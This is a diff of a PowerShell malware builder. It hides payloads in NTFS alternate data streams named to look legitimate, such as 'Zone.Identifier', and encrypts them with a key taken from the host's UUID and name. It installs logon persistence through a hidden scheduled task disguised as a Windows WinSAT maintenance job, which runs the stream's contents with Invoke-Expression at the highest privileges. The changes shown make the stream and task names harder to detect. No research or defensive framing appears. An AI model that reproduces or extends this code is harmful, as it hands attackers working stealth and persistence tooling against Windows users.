@@ -34,10 +34,10 @@ function Get-RandomADSConfig {
         $legitimateStreams = @('Zone.Identifier', 'SmartScreen', 'Catalog', 'appcompat.txt')
         $randomStreams = @(1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }) -join ''
         
+        $randomStream = (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }) -join ''
         StreamName = if($Randomize) { 
-            ':' + (Get-Random -InputObject (@($legitimateStreams) + $randomStreams))
-        } else { 
-            ':syc_payload' }
+            ':' + (Get-Random -InputObject $legitimateStreams + $randomStream)
+        } else { ':syc_payload' }
         # Generate 32-byte key from UUID + hostname
         $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
         $sha256 = [System.Security.Cryptography.SHA256]::Create()
@@ -164,7 +164,7 @@ function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
             Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
             
             # Create task to execute root ADS on logon
-            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((Get-Random -Minimum 100 -Maximum 999))"
+            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((New-Guid).Guid.Split('-')[0])"
             $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
             
             & schtasks /create /tn $taskName /tr $action /sc onlogon /rl highest /f | Out-Null
@@ -219,7 +219,9 @@ $allFunctions
 `$Encrypt = `$$EncryptFlag
 `$NoExec = `$$NoExecFlag
 
-`$rawPayload = ConvertTo-PSPayload '$($PayloadObj -replace "'","''")'
+`$rawPayload = ConvertTo-PSPayload @'
+$($PayloadObj -join "`n")
+'@
 `$cfg = Get-RandomADSConfig
 `$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
 `$loaderPath = New-Loader `$adsPath `$cfg
